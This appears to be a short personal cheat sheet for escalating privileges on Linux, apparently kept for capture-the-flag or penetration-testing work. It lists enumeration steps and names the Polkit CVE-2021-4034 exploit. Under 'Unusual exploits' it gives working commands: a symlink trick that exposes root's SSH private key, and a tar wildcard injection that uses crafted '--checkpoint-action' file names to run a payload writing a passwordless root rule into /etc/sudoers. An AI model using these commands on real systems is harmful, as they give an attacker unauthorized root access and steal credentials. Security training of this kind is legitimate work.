
#### SOP for Linux 

0. Disk group: id => debugfs /dev/sdaX 
1. Check sudo -l and su 
2. SUID => GTFObins (eg strace, env) 
3. Cron jobs in /etc/crontab ; PATH has /dev/shm ? 
4. Find creds in /var/www 
5. Find databases like *.db 
6. Exploits, eg Polkit CVE-2021-4034 



#### Unusual exploits 
- Run `ln -s /root/.ssh/id_rsa /var/log/gitlab/root_key` then `unzip /opt/backups/backup.zip` 
- Privesc = tar ; put `echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers` in payload.sh 
- - Then `echo "" > '--checkpoint=1'` and `echo "" > '--checkpoint-action=exec=sh payload.sh'` and tar. 
- Download mlocate.db to list unusual files. 

